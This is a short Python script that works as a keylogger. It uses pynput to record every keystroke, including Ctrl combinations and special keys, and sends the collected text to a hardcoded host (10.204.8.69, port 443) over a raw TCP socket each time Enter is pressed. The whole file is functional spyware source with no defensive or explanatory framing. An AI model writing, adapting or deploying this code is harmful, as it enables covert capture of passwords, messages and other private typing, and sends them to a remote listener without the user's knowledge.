import socket
from pynput.keyboard import Listener, Key
from threading import Thread


keys = []
ctrl_pressed = False
logstring="\n"

def key_press(key):
    global ctrl_pressed
    global logstring

    if key == Key.ctrl:
        ctrl_pressed = True
    elif ctrl_pressed:
        logstring+=f'\nCtrl+{str(key)}'
        ctrl_pressed = False
        return

    if key != Key.enter:                               # send data to server if enter is pressed
        if (str(key)).__contains__("Key."):
            if key == Key.space:
                logstring += " "
            else:
                if len(logstring) > 1:
                    logstring += "\n"
                    logstring += str(key).strip("'")
                else:
                    logstring += str(key).strip("'")
                    logstring += "\n"
            

        else: 
            logstring += str(key).strip("'")
    else:
        s.sendall((logstring).encode('utf-8'))
        logstring = "\n"


host = '10.204.8.69'
port = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		# TCP socket object
s.connect((host,port))

with Listener(on_press=key_press) as the_listener:
    the_listener.join()